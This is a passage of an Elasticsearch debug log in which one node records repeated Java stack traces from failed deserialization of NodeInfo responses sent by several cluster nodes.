    at org.elasticsearch.common.netty.util.ThreadRenamingRunnable.run(ThreadRenamingRunnable.java:108)
    at org.elasticsearch.common.netty.util.internal.DeadLockProofWorker$1.run(DeadLockProofWorker.java:42)
    at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
    at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615)
    at java.lang.Thread.run(Thread.java:745)
Caused by: java.lang.IndexOutOfBoundsException: Readable byte limit exceeded: 8436
    at org.elasticsearch.common.netty.buffer.AbstractChannelBuffer.readByte(AbstractChannelBuffer.java:236)
    at org.elasticsearch.transport.netty.ChannelBufferStreamInput.readByte(ChannelBufferStreamInput.java:132)
    at org.elasticsearch.common.io.stream.StreamInput.readString(StreamInput.java:266)
    at org.elasticsearch.common.io.stream.HandlesStreamInput.readString(HandlesStreamInput.java:61)
    at org.elasticsearch.threadpool.ThreadPool$Info.readFrom(ThreadPool.java:595)
    at org.elasticsearch.threadpool.ThreadPoolInfo.readFrom(ThreadPoolInfo.java:65)
    at org.elasticsearch.threadpool.ThreadPoolInfo.readThreadPoolInfo(ThreadPoolInfo.java:55)
    at org.elasticsearch.action.admin.cluster.node.info.NodeInfo.readFrom(NodeInfo.java:224)
    at org.elasticsearch.transport.netty.MessageChannelHandler.handleResponse(MessageChannelHandler.java:146)
    ... 23 more
[2014-08-28 01:00:07,599][DEBUG][action.admin.cluster.node.info] [4gbes1] failed to execute on node [WqnW6SX3TfCLTbBvFcYQgA]
org.elasticsearch.transport.RemoteTransportException: Failed to deserialize response of type [org.elasticsearch.action.admin.cluster.node.info.NodeInfo]
Caused by: org.elasticsearch.transport.TransportSerializationException: Failed to deserialize response of type [org.elasticsearch.action.admin.cluster.node.info.NodeInfo]
    at org.elasticsearch.transport.netty.MessageChannelHandler.handleResponse(MessageChannelHandler.java:148)
    at org.elasticsearch.transport.netty.MessageChannelHandler.messageReceived(MessageChannelHandler.java:125)
    at org.elasticsearch.common.netty.channel.SimpleChannelUpstreamHandler.handleUpstream(SimpleChannelUpstreamHandler.java:70)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline.sendUpstream(DefaultChannelPipeline.java:564)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline$DefaultChannelHandlerContext.sendUpstream(DefaultChannelPipeline.java:791)
    at org.elasticsearch.common.netty.channel.Channels.fireMessageReceived(Channels.java:296)
    at org.elasticsearch.common.netty.handler.codec.frame.FrameDecoder.unfoldAndFireMessageReceived(FrameDecoder.java:462)
    at org.elasticsearch.common.netty.handler.codec.frame.FrameDecoder.callDecode(FrameDecoder.java:443)
    at org.elasticsearch.common.netty.handler.codec.frame.FrameDecoder.messageReceived(FrameDecoder.java:303)
    at org.elasticsearch.common.netty.channel.SimpleChannelUpstreamHandler.handleUpstream(SimpleChannelUpstreamHandler.java:70)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline.sendUpstream(DefaultChannelPipeline.java:564)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline.sendUpstream(DefaultChannelPipeline.java:559)
    at org.elasticsearch.common.netty.channel.Channels.fireMessageReceived(Channels.java:268)
    at org.elasticsearch.common.netty.channel.Channels.fireMessageReceived(Channels.java:255)
    at org.elasticsearch.common.netty.channel.socket.nio.NioWorker.read(NioWorker.java:88)
    at org.elasticsearch.common.netty.channel.socket.nio.AbstractNioWorker.process(AbstractNioWorker.java:108)
    at org.elasticsearch.common.netty.channel.socket.nio.AbstractNioSelector.run(AbstractNioSelector.java:318)
    at org.elasticsearch.common.netty.channel.socket.nio.AbstractNioWorker.run(AbstractNioWorker.java:89)
    at org.elasticsearch.common.netty.channel.socket.nio.NioWorker.run(NioWorker.java:178)
    at org.elasticsearch.common.netty.util.ThreadRenamingRunnable.run(ThreadRenamingRunnable.java:108)
    at org.elasticsearch.common.netty.util.internal.DeadLockProofWorker$1.run(DeadLockProofWorker.java:42)
    at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
    at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615)
    at java.lang.Thread.run(Thread.java:745)
Caused by: java.lang.IndexOutOfBoundsException: Readable byte limit exceeded: 8434
    at org.elasticsearch.common.netty.buffer.AbstractChannelBuffer.readByte(AbstractChannelBuffer.java:236)
    at org.elasticsearch.transport.netty.ChannelBufferStreamInput.readByte(ChannelBufferStreamInput.java:132)
    at org.elasticsearch.common.io.stream.StreamInput.readString(StreamInput.java:266)
    at org.elasticsearch.common.io.stream.HandlesStreamInput.readString(HandlesStreamInput.java:61)
    at org.elasticsearch.threadpool.ThreadPool$Info.readFrom(ThreadPool.java:595)
    at org.elasticsearch.threadpool.ThreadPoolInfo.readFrom(ThreadPoolInfo.java:65)
    at org.elasticsearch.threadpool.ThreadPoolInfo.readThreadPoolInfo(ThreadPoolInfo.java:55)
    at org.elasticsearch.action.admin.cluster.node.info.NodeInfo.readFrom(NodeInfo.java:224)
    at org.elasticsearch.transport.netty.MessageChannelHandler.handleResponse(MessageChannelHandler.java:146)
    ... 23 more
[2014-08-28 01:00:07,596][DEBUG][action.admin.cluster.node.info] [4gbes1] failed to execute on node [lXDpSZ3OQCu6eVulQVcbiQ]
org.elasticsearch.transport.RemoteTransportException: Failed to deserialize response of type [org.elasticsearch.action.admin.cluster.node.info.NodeInfo]
Caused by: org.elasticsearch.transport.TransportSerializationException: Failed to deserialize response of type [org.elasticsearch.action.admin.cluster.node.info.NodeInfo]
    at org.elasticsearch.transport.netty.MessageChannelHandler.handleResponse(MessageChannelHandler.java:148)
    at org.elasticsearch.transport.netty.MessageChannelHandler.messageReceived(MessageChannelHandler.java:125)
    at org.elasticsearch.common.netty.channel.SimpleChannelUpstreamHandler.handleUpstream(SimpleChannelUpstreamHandler.java:70)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline.sendUpstream(DefaultChannelPipeline.java:564)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline$DefaultChannelHandlerContext.sendUpstream(DefaultChannelPipeline.java:791)
    at org.elasticsearch.common.netty.channel.Channels.fireMessageReceived(Channels.java:296)
    at org.elasticsearch.common.netty.handler.codec.frame.FrameDecoder.unfoldAndFireMessageReceived(FrameDecoder.java:462)
    at org.elasticsearch.common.netty.handler.codec.frame.FrameDecoder.callDecode(FrameDecoder.java:443)
    at org.elasticsearch.common.netty.handler.codec.frame.FrameDecoder.messageReceived(FrameDecoder.java:303)
    at org.elasticsearch.common.netty.channel.SimpleChannelUpstreamHandler.handleUpstream(SimpleChannelUpstreamHandler.java:70)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline.sendUpstream(DefaultChannelPipeline.java:564)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline.sendUpstream(DefaultChannelPipeline.java:559)
    at org.elasticsearch.common.netty.channel.Channels.fireMessageReceived(Channels.java:268)
    at org.elasticsearch.common.netty.channel.Channels.fireMessageReceived(Channels.java:255)
    at org.elasticsearch.common.netty.channel.socket.nio.NioWorker.read(NioWorker.java:88)
    at org.elasticsearch.common.netty.channel.socket.nio.AbstractNioWorker.process(AbstractNioWorker.java:108)
    at org.elasticsearch.common.netty.channel.socket.nio.AbstractNioSelector.run(AbstractNioSelector.java:318)
    at org.elasticsearch.common.netty.channel.socket.nio.AbstractNioWorker.run(AbstractNioWorker.java:89)
    at org.elasticsearch.common.netty.channel.socket.nio.NioWorker.run(NioWorker.java:178)
    at org.elasticsearch.common.netty.util.ThreadRenamingRunnable.run(ThreadRenamingRunnable.java:108)
    at org.elasticsearch.common.netty.util.internal.DeadLockProofWorker$1.run(DeadLockProofWorker.java:42)
    at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
    at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615)
    at java.lang.Thread.run(Thread.java:745)
Caused by: java.lang.IndexOutOfBoundsException: Readable byte limit exceeded: 8528
    at org.elasticsearch.common.netty.buffer.AbstractChannelBuffer.readByte(AbstractChannelBuffer.java:236)
    at org.elasticsearch.transport.netty.ChannelBufferStreamInput.readByte(ChannelBufferStreamInput.java:132)
    at org.elasticsearch.common.io.stream.StreamInput.readString(StreamInput.java:266)
    at org.elasticsearch.common.io.stream.HandlesStreamInput.readString(HandlesStreamInput.java:61)
    at org.elasticsearch.threadpool.ThreadPool$Info.readFrom(ThreadPool.java:596)
    at org.elasticsearch.threadpool.ThreadPoolInfo.readFrom(ThreadPoolInfo.java:65)
    at org.elasticsearch.threadpool.ThreadPoolInfo.readThreadPoolInfo(ThreadPoolInfo.java:55)
    at org.elasticsearch.action.admin.cluster.node.info.NodeInfo.readFrom(NodeInfo.java:224)
    at org.elasticsearch.transport.netty.MessageChannelHandler.handleResponse(MessageChannelHandler.java:146)
    ... 23 more
[2014-08-28 01:00:07,605][DEBUG][action.admin.cluster.node.info] [4gbes1] failed to execute on node [myWkK47kRxSh93CRKH5O3w]
org.elasticsearch.transport.RemoteTransportException: Failed to deserialize response of type [org.elasticsearch.action.admin.cluster.node.info.NodeInfo]
Caused by: org.elasticsearch.transport.TransportSerializationException: Failed to deserialize response of type [org.elasticsearch.action.admin.cluster.node.info.NodeInfo]
    at org.elasticsearch.transport.netty.MessageChannelHandler.handleResponse(MessageChannelHandler.java:148)
    at org.elasticsearch.transport.netty.MessageChannelHandler.messageReceived(MessageChannelHandler.java:125)
    at org.elasticsearch.common.netty.channel.SimpleChannelUpstreamHandler.handleUpstream(SimpleChannelUpstreamHandler.java:70)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline.sendUpstream(DefaultChannelPipeline.java:564)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline$DefaultChannelHandlerContext.sendUpstream(DefaultChannelPipeline.java:791)
    at org.elasticsearch.common.netty.channel.Channels.fireMessageReceived(Channels.java:296)
    at org.elasticsearch.common.netty.handler.codec.frame.FrameDecoder.unfoldAndFireMessageReceived(FrameDecoder.java:462)
    at org.elasticsearch.common.netty.handler.codec.frame.FrameDecoder.callDecode(FrameDecoder.java:443)
    at org.elasticsearch.common.netty.handler.codec.frame.FrameDecoder.messageReceived(FrameDecoder.java:310)
    at org.elasticsearch.common.netty.channel.SimpleChannelUpstreamHandler.handleUpstream(SimpleChannelUpstreamHandler.java:70)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline.sendUpstream(DefaultChannelPipeline.java:564)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline.sendUpstream(DefaultChannelPipeline.java:559)
    at org.elasticsearch.common.netty.channel.Channels.fireMessageReceived(Channels.java:268)
    at org.elasticsearch.common.netty.channel.Channels.fireMessageReceived(Channels.java:255)
    at org.elasticsearch.common.netty.channel.socket.nio.NioWorker.read(NioWorker.java:88)
    at org.elasticsearch.common.netty.channel.socket.nio.AbstractNioWorker.process(AbstractNioWorker.java:108)
    at org.elasticsearch.common.netty.channel.socket.nio.AbstractNioSelector.run(AbstractNioSelector.java:318)
    at org.elasticsearch.common.netty.channel.socket.nio.AbstractNioWorker.run(AbstractNioWorker.java:89)
    at org.elasticsearch.common.netty.channel.socket.nio.NioWorker.run(NioWorker.java:178)
    at org.elasticsearch.common.netty.util.ThreadRenamingRunnable.run(ThreadRenamingRunnable.java:108)
    at org.elasticsearch.common.netty.util.internal.DeadLockProofWorker$1.run(DeadLockProofWorker.java:42)
    at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
    at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615)
    at java.lang.Thread.run(Thread.java:745)
Caused by: java.lang.IndexOutOfBoundsException: Readable byte limit exceeded: 8435
    at org.elasticsearch.common.netty.buffer.AbstractChannelBuffer.readByte(AbstractChannelBuffer.java:236)
    at org.elasticsearch.transport.netty.ChannelBufferStreamInput.readByte(ChannelBufferStreamInput.java:132)
    at org.elasticsearch.common.io.stream.StreamInput.readString(StreamInput.java:266)
    at org.elasticsearch.common.io.stream.HandlesStreamInput.readString(HandlesStreamInput.java:61)
    at org.elasticsearch.threadpool.ThreadPool$Info.readFrom(ThreadPool.java:595)
    at org.elasticsearch.threadpool.ThreadPoolInfo.readFrom(ThreadPoolInfo.java:65)
    at org.elasticsearch.threadpool.ThreadPoolInfo.readThreadPoolInfo(ThreadPoolInfo.java:55)
    at org.elasticsearch.action.admin.cluster.node.info.NodeInfo.readFrom(NodeInfo.java:224)
    at org.elasticsearch.transport.netty.MessageChannelHandler.handleResponse(MessageChannelHandler.java:146)
    ... 23 more
[2014-08-28 01:00:07,898][DEBUG][action.admin.cluster.node.info] [4gbes1] failed to execute on node [lLjxLWhoSti-hvdAuJ2wUg]
org.elasticsearch.transport.RemoteTransportException: Failed to deserialize response of type [org.elasticsearch.action.admin.cluster.node.info.NodeInfo]
Caused by: org.elasticsearch.transport.TransportSerializationException: Failed to deserialize response of type [org.elasticsearch.action.admin.cluster.node.info.NodeInfo]
    at org.elasticsearch.transport.netty.MessageChannelHandler.handleResponse(MessageChannelHandler.java:148)
    at org.elasticsearch.transport.netty.MessageChannelHandler.messageReceived(MessageChannelHandler.java:125)
    at org.elasticsearch.common.netty.channel.SimpleChannelUpstreamHandler.handleUpstream(SimpleChannelUpstreamHandler.java:70)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline.sendUpstream(DefaultChannelPipeline.java:564)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline$DefaultChannelHandlerContext.sendUpstream(DefaultChannelPipeline.java:791)
    at org.elasticsearch.common.netty.channel.Channels.fireMessageReceived(Channels.java:296)
    at org.elasticsearch.common.netty.handler.codec.frame.FrameDecoder.unfoldAndFireMessageReceived(FrameDecoder.java:462)
    at org.elasticsearch.common.netty.handler.codec.frame.FrameDecoder.callDecode(FrameDecoder.java:443)
    at org.elasticsearch.common.netty.handler.codec.frame.FrameDecoder.messageReceived(FrameDecoder.java:303)
    at org.elasticsearch.common.netty.channel.SimpleChannelUpstreamHandler.handleUpstream(SimpleChannelUpstreamHandler.java:70)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline.sendUpstream(DefaultChannelPipeline.java:564)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline.sendUpstream(DefaultChannelPipeline.java:559)
    at org.elasticsearch.common.netty.channel.Channels.fireMessageReceived(Channels.java:268)
    at org.elasticsearch.common.netty.channel.Channels.fireMessageReceived(Channels.java:255)
    at org.elasticsearch.common.netty.channel.socket.nio.NioWorker.read(NioWorker.java:88)
    at org.elasticsearch.common.netty.channel.socket.nio.AbstractNioWorker.process(AbstractNioWorker.java:108)
    at org.elasticsearch.common.netty.channel.socket.nio.AbstractNioSelector.run(AbstractNioSelector.java:318)
    at org.elasticsearch.common.netty.channel.socket.nio.AbstractNioWorker.run(AbstractNioWorker.java:89)
    at org.elasticsearch.common.netty.channel.socket.nio.NioWorker.run(NioWorker.java:178)
    at org.elasticsearch.common.netty.util.ThreadRenamingRunnable.run(ThreadRenamingRunnable.java:108)
    at org.elasticsearch.common.netty.util.internal.DeadLockProofWorker$1.run(DeadLockProofWorker.java:42)
    at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
    at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615)
    at java.lang.Thread.run(Thread.java:745)
Caused by: java.lang.IndexOutOfBoundsException: Readable byte limit exceeded: 8436
    at org.elasticsearch.common.netty.buffer.AbstractChannelBuffer.readByte(AbstractChannelBuffer.java:236)
    at org.elasticsearch.transport.netty.ChannelBufferStreamInput.readByte(ChannelBufferStreamInput.java:132)
    at org.elasticsearch.common.io.stream.StreamInput.readString(StreamInput.java:266)
    at org.elasticsearch.common.io.stream.HandlesStreamInput.readString(HandlesStreamInput.java:61)
    at org.elasticsearch.threadpool.ThreadPool$Info.readFrom(ThreadPool.java:596)
    at org.elasticsearch.threadpool.ThreadPoolInfo.readFrom(ThreadPoolInfo.java:65)
    at org.elasticsearch.threadpool.ThreadPoolInfo.readThreadPoolInfo(ThreadPoolInfo.java:55)
    at org.elasticsearch.action.admin.cluster.node.info.NodeInfo.readFrom(NodeInfo.java:224)
    at org.elasticsearch.transport.netty.MessageChannelHandler.handleResponse(MessageChannelHandler.java:146)
    ... 23 more
[2014-08-28 01:00:07,900][DEBUG][action.admin.cluster.node.info] [4gbes1] failed to execute on node [myWkK47kRxSh93CRKH5O3w]
org.elasticsearch.transport.RemoteTransportException: Failed to deserialize response of type [org.elasticsearch.action.admin.cluster.node.info.NodeInfo]
Caused by: org.elasticsearch.transport.TransportSerializationException: Failed to deserialize response of type [org.elasticsearch.action.admin.cluster.node.info.NodeInfo]
    at org.elasticsearch.transport.netty.MessageChannelHandler.handleResponse(MessageChannelHandler.java:148)
    at org.elasticsearch.transport.netty.MessageChannelHandler.messageReceived(MessageChannelHandler.java:125)
    at org.elasticsearch.common.netty.channel.SimpleChannelUpstreamHandler.handleUpstream(SimpleChannelUpstreamHandler.java:70)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline.sendUpstream(DefaultChannelPipeline.java:564)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline$DefaultChannelHandlerContext.sendUpstream(DefaultChannelPipeline.java:791)
    at org.elasticsearch.common.netty.channel.Channels.fireMessageReceived(Channels.java:296)
    at org.elasticsearch.common.netty.handler.codec.frame.FrameDecoder.unfoldAndFireMessageReceived(FrameDecoder.java:462)
    at org.elasticsearch.common.netty.handler.codec.frame.FrameDecoder.callDecode(FrameDecoder.java:443)
    at org.elasticsearch.common.netty.handler.codec.frame.FrameDecoder.messageReceived(FrameDecoder.java:303)
    at org.elasticsearch.common.netty.channel.SimpleChannelUpstreamHandler.handleUpstream(SimpleChannelUpstreamHandler.java:70)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline.sendUpstream(DefaultChannelPipeline.java:564)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline.sendUpstream(DefaultChannelPipeline.java:559)
    at org.elasticsearch.common.netty.channel.Channels.fireMessageReceived(Channels.java:268)
    at org.elasticsearch.common.netty.channel.Channels.fireMessageReceived(Channels.java:255)
    at org.elasticsearch.common.netty.channel.socket.nio.NioWorker.read(NioWorker.java:88)
    at org.elasticsearch.common.netty.channel.socket.nio.AbstractNioWorker.process(AbstractNioWorker.java:108)
    at org.elasticsearch.common.netty.channel.socket.nio.AbstractNioSelector.run(AbstractNioSelector.java:318)
    at org.elasticsearch.common.netty.channel.socket.nio.AbstractNioWorker.run(AbstractNioWorker.java:89)
    at org.elasticsearch.common.netty.channel.socket.nio.NioWorker.run(NioWorker.java:178)
    at org.elasticsearch.common.netty.util.ThreadRenamingRunnable.run(ThreadRenamingRunnable.java:108)
    at org.elasticsearch.common.netty.util.internal.DeadLockProofWorker$1.run(DeadLockProofWorker.java:42)
    at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
    at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615)
    at java.lang.Thread.run(Thread.java:745)
Caused by: java.lang.IndexOutOfBoundsException: Readable byte limit exceeded: 8435
    at org.elasticsearch.common.netty.buffer.AbstractChannelBuffer.readByte(AbstractChannelBuffer.java:236)
    at org.elasticsearch.transport.netty.ChannelBufferStreamInput.readByte(ChannelBufferStreamInput.java:132)
    at org.elasticsearch.common.io.stream.StreamInput.readString(StreamInput.java:266)
    at org.elasticsearch.common.io.stream.HandlesStreamInput.readString(HandlesStreamInput.java:61)
    at org.elasticsearch.threadpool.ThreadPool$Info.readFrom(ThreadPool.java:595)
    at org.elasticsearch.threadpool.ThreadPoolInfo.readFrom(ThreadPoolInfo.java:65)
    at org.elasticsearch.threadpool.ThreadPoolInfo.readThreadPoolInfo(ThreadPoolInfo.java:55)
    at org.elasticsearch.action.admin.cluster.node.info.NodeInfo.readFrom(NodeInfo.java:224)
    at org.elasticsearch.transport.netty.MessageChannelHandler.handleResponse(MessageChannelHandler.java:146)
    ... 23 more
[2014-08-28 01:00:07,898][DEBUG][action.admin.cluster.node.info] [4gbes1] failed to execute on node [lXDpSZ3OQCu6eVulQVcbiQ]
org.elasticsearch.transport.RemoteTransportException: Failed to deserialize response of type [org.elasticsearch.action.admin.cluster.node.info.NodeInfo]
Caused by: org.elasticsearch.transport.TransportSerializationException: Failed to deserialize response of type [org.elasticsearch.action.admin.cluster.node.info.NodeInfo]
    at org.elasticsearch.transport.netty.MessageChannelHandler.handleResponse(MessageChannelHandler.java:148)
    at org.elasticsearch.transport.netty.MessageChannelHandler.messageReceived(MessageChannelHandler.java:125)
    at org.elasticsearch.common.netty.channel.SimpleChannelUpstreamHandler.handleUpstream(SimpleChannelUpstreamHandler.java:70)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline.sendUpstream(DefaultChannelPipeline.java:564)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline$DefaultChannelHandlerContext.sendUpstream(DefaultChannelPipeline.java:791)
    at org.elasticsearch.common.netty.channel.Channels.fireMessageReceived(Channels.java:296)
    at org.elasticsearch.common.netty.handler.codec.frame.FrameDecoder.unfoldAndFireMessageReceived(FrameDecoder.java:462)
    at org.elasticsearch.common.netty.handler.codec.frame.FrameDecoder.callDecode(FrameDecoder.java:443)
    at org.elasticsearch.common.netty.handler.codec.frame.FrameDecoder.messageReceived(FrameDecoder.java:303)
    at org.elasticsearch.common.netty.channel.SimpleChannelUpstreamHandler.handleUpstream(SimpleChannelUpstreamHandler.java:70)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline.sendUpstream(DefaultChannelPipeline.java:564)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline.sendUpstream(DefaultChannelPipeline.java:559)
    at org.elasticsearch.common.netty.channel.Channels.fireMessageReceived(Channels.java:268)
    at org.elasticsearch.common.netty.channel.Channels.fireMessageReceived(Channels.java:255)
    at org.elasticsearch.common.netty.channel.socket.nio.NioWorker.read(NioWorker.java:88)
    at org.elasticsearch.common.netty.channel.socket.nio.AbstractNioWorker.process(AbstractNioWorker.java:108)
    at org.elasticsearch.common.netty.channel.socket.nio.AbstractNioSelector.run(AbstractNioSelector.java:318)
    at org.elasticsearch.common.netty.channel.socket.nio.AbstractNioWorker.run(AbstractNioWorker.java:89)
    at org.elasticsearch.common.netty.channel.socket.nio.NioWorker.run(NioWorker.java:178)
    at org.elasticsearch.common.netty.util.ThreadRenamingRunnable.run(ThreadRenamingRunnable.java:108)
    at org.elasticsearch.common.netty.util.internal.DeadLockProofWorker$1.run(DeadLockProofWorker.java:42)
    at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
    at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615)
    at java.lang.Thread.run(Thread.java:745)
Caused by: java.lang.IndexOutOfBoundsException: Readable byte limit exceeded: 8528
    at org.elasticsearch.common.netty.buffer.AbstractChannelBuffer.readByte(AbstractChannelBuffer.java:236)
    at org.elasticsearch.transport.netty.ChannelBufferStreamInput.readByte(ChannelBufferStreamInput.java:132)
    at org.elasticsearch.common.io.stream.StreamInput.readString(StreamInput.java:266)
    at org.elasticsearch.common.io.stream.HandlesStreamInput.readString(HandlesStreamInput.java:61)
    at org.elasticsearch.threadpool.ThreadPool$Info.readFrom(ThreadPool.java:596)
    at org.elasticsearch.threadpool.ThreadPoolInfo.readFrom(ThreadPoolInfo.java:65)
    at org.elasticsearch.threadpool.ThreadPoolInfo.readThreadPoolInfo(ThreadPoolInfo.java:55)
    at org.elasticsearch.action.admin.cluster.node.info.NodeInfo.readFrom(NodeInfo.java:224)
    at org.elasticsearch.transport.netty.MessageChannelHandler.handleResponse(MessageChannelHandler.java:146)
    ... 23 more
[2014-08-28 01:00:07,900][DEBUG][action.admin.cluster.node.info] [4gbes1] failed to execute on node [RgzCfs2_RE27p6RgzEb1Jw]
org.elasticsearch.transport.RemoteTransportException: Failed to deserialize response of type [org.elasticsearch.action.admin.cluster.node.info.NodeInfo]
Caused by: org.elasticsearch.transport.TransportSerializationException: Failed to deserialize response of type [org.elasticsearch.action.admin.cluster.node.info.NodeInfo]
    at org.elasticsearch.transport.netty.MessageChannelHandler.handleResponse(MessageChannelHandler.java:148)
    at org.elasticsearch.transport.netty.MessageChannelHandler.messageReceived(MessageChannelHandler.java:125)
    at org.elasticsearch.common.netty.channel.SimpleChannelUpstreamHandler.handleUpstream(SimpleChannelUpstreamHandler.java:70)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline.sendUpstream(DefaultChannelPipeline.java:564)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline$DefaultChannelHandlerContext.sendUpstream(DefaultChannelPipeline.java:791)
    at org.elasticsearch.common.netty.channel.Channels.fireMessageReceived(Channels.java:296)
    at org.elasticsearch.common.netty.handler.codec.frame.FrameDecoder.unfoldAndFireMessageReceived(FrameDecoder.java:462)
    at org.elasticsearch.common.netty.handler.codec.frame.FrameDecoder.callDecode(FrameDecoder.java:443)
    at org.elasticsearch.common.netty.handler.codec.frame.FrameDecoder.messageReceived(FrameDecoder.java:303)
    at org.elasticsearch.common.netty.channel.SimpleChannelUpstreamHandler.handleUpstream(SimpleChannelUpstreamHandler.java:70)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline.sendUpstream(DefaultChannelPipeline.java:564)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline.sendUpstream(DefaultChannelPipeline.java:559)
    at org.elasticsearch.common.netty.channel.Channels.fireMessageReceived(Channels.java:268)
    at org.elasticsearch.common.netty.channel.Channels.fireMessageReceived(Channels.java:255)
    at org.elasticsearch.common.netty.channel.socket.nio.NioWorker.read(NioWorker.java:88)
    at org.elasticsearch.common.netty.channel.socket.nio.AbstractNioWorker.process(AbstractNioWorker.java:108)
    at org.elasticsearch.common.netty.channel.socket.nio.AbstractNioSelector.run(AbstractNioSelector.java:318)
    at org.elasticsearch.common.netty.channel.socket.nio.AbstractNioWorker.run(AbstractNioWorker.java:89)
    at org.elasticsearch.common.netty.channel.socket.nio.NioWorker.run(NioWorker.java:178)
    at org.elasticsearch.common.netty.util.ThreadRenamingRunnable.run(ThreadRenamingRunnable.java:108)
    at org.elasticsearch.common.netty.util.internal.DeadLockProofWorker$1.run(DeadLockProofWorker.java:42)
    at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
    at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615)
    at java.lang.Thread.run(Thread.java:745)
Caused by: java.lang.IndexOutOfBoundsException: Readable byte limit exceeded: 8436
    at org.elasticsearch.common.netty.buffer.AbstractChannelBuffer.readByte(AbstractChannelBuffer.java:236)
    at org.elasticsearch.transport.netty.ChannelBufferStreamInput.readByte(ChannelBufferStreamInput.java:132)
    at org.elasticsearch.common.io.stream.StreamInput.readString(StreamInput.java:266)
    at org.elasticsearch.common.io.stream.HandlesStreamInput.readString(HandlesStreamInput.java:61)
    at org.elasticsearch.threadpool.ThreadPool$Info.readFrom(ThreadPool.java:595)
    at org.elasticsearch.threadpool.ThreadPoolInfo.readFrom(ThreadPoolInfo.java:65)
    at org.elasticsearch.threadpool.ThreadPoolInfo.readThreadPoolInfo(ThreadPoolInfo.java:55)
    at org.elasticsearch.action.admin.cluster.node.info.NodeInfo.readFrom(NodeInfo.java:224)
    at org.elasticsearch.transport.netty.MessageChannelHandler.handleResponse(MessageChannelHandler.java:146)
    ... 23 more
[2014-08-28 01:00:07,904][DEBUG][action.admin.cluster.node.info] [4gbes1] failed to execute on node [WqnW6SX3TfCLTbBvFcYQgA]
org.elasticsearch.transport.RemoteTransportException: Failed to deserialize response of type [org.elasticsearch.action.admin.cluster.node.info.NodeInfo]
Caused by: org.elasticsearch.transport.TransportSerializationException: Failed to deserialize response of type [org.elasticsearch.action.admin.cluster.node.info.NodeInfo]
    at org.elasticsearch.transport.netty.MessageChannelHandler.handleResponse(MessageChannelHandler.java:148)
    at org.elasticsearch.transport.netty.MessageChannelHandler.messageReceived(MessageChannelHandler.java:125)
    at org.elasticsearch.common.netty.channel.SimpleChannelUpstreamHandler.handleUpstream(SimpleChannelUpstreamHandler.java:70)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline.sendUpstream(DefaultChannelPipeline.java:564)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline$DefaultChannelHandlerContext.sendUpstream(DefaultChannelPipeline.java:791)
    at org.elasticsearch.common.netty.channel.Channels.fireMessageReceived(Channels.java:296)
    at org.elasticsearch.common.netty.handler.codec.frame.FrameDecoder.unfoldAndFireMessageReceived(FrameDecoder.java:462)
    at org.elasticsearch.common.netty.handler.codec.frame.FrameDecoder.callDecode(FrameDecoder.java:443)
    at org.elasticsearch.common.netty.handler.codec.frame.FrameDecoder.messageReceived(FrameDecoder.java:303)
    at org.elasticsearch.common.netty.channel.SimpleChannelUpstreamHandler.handleUpstream(SimpleChannelUpstreamHandler.java:70)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline.sendUpstream(DefaultChannelPipeline.java:564)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline.sendUpstream(DefaultChannelPipeline.java:559)
    at org.elasticsearch.common.netty.channel.Channels.fireMessageReceived(Channels.java:268)
    at org.elasticsearch.common.netty.channel.Channels.fireMessageReceived(Channels.java:255)
    at org.elasticsearch.common.netty.channel.socket.nio.NioWorker.read(NioWorker.java:88)
    at org.elasticsearch.common.netty.channel.socket.nio.AbstractNioWorker.process(AbstractNioWorker.java:108)
    at org.elasticsearch.common.netty.channel.socket.nio.AbstractNioSelector.run(AbstractNioSelector.java:318)
